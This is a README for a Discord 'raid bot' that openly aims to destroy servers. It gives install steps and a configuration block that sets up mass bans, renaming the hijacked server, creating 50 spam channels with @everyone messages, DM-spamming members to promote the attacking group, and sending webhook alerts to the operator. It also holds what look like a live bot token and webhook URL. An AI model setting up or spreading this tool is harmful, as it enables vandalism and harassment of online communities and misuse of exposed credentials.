# Bl0dRasher
Raid Bot for Discord (Destroy Servers)

## Prerequisites
* Python 3.x
* And the modules

To install the modules:
```
pip3 install requirements.txt
```
## Enable Privileged Gateway Intents
In order for the bot to work correctly, (some things like the ban don't usually work if you don't do this) you must activate the following fields, which are a novelty for the discord api.

<p><a href="https://discord.com/developers/applications/">Go to discord developers.</a> > Go to the bot you want to run. > Go to the "bot" section and activate these fields.</p>

<img src="https://i.imgur.com/kj5DB6f.png" width=60%>

## How to configure
Edit the following lines of the file "blood.py"
```python
# Change the information
token = "NzY5MjMwODcxMDEzNzUyODQz.X5MAEw.dKnr81y_9yqPmZNul84TXh5eLqk"
prefix = "$"


##### If database is true, new functions of the bot will be used, such that only users registered in the database can use it.
database = True


##### WEBHOOK CONFIGURATION:
# If webhook is True when somebody attack a server get notification with user and server id
webhook = True
webhook_url = "https://discordapp.com/api/webhooks/780641361468719136/95kC-ZgYntSOgxQ8SjDt6t_oKFc1DvX3xCBC5UuUG6TywQjkFTL-lZOj6ztDmnBnb8Tj"
# If i have this color "#DC143C" change # for 0x, result "0xDC143C"
webhook_color = 0xb81c00
# Only link
webhook_image = "https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429"


##### CHANGE COMMAND CONFIG:
guild_name = "Raided By Blood Moon"
guild_picture = "Pic/Blood_Moon.jpg"


##### CREATE CHANNELS CONFIG:
# As long as the message is True, normal messages will be sent; if it becomes False, it will send embeds
message = False
name_channel = "raided-by-bloodmoon"
# Number of channels that the bot will create.
num_channels = 50
# Number of messages for each channel created. It doesn't work if you use a embed type message.
num_messages = 5
# Message to send in the created channel
message_channels = "@everyone Fucked by Blood Moon."
## Embed config:
embed_title = "Raided by Blood Moon."
embed_desc = "Server fucked by Blood Moon."
# If i have this color "#DC143C" change # for 0x, result "0xDC143C"
embed_color = 0xb81c00
embed_link = "https://discord.gg/test"
embed_picture = "https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429"


##### DM CONFIG:
# As long as embed_dm is True an embed will be sent instead of a normal message.
embed_dm = True
embed_titledm = "Raided By Blood Moon."
embed_descdm = "Server fucked by Blood Moon."
# If i have this color "#DC143C" change # for 0x, result "0xDC143C"
embed_colordm = 0xb81c00
# Group link to promote in the raid
embed_linkdm = "https://discord.gg/test"
embed_picturedm = "https://media.discordapp.net/attachments/777622927993864242/780586514043895858/photo_2020-11-23_08-57-51.jpg?width=429&height=429"
# The message to be sent when "embed_dm" is false
message_dm = "A server where you were was fucked up by Blood Moon."
```
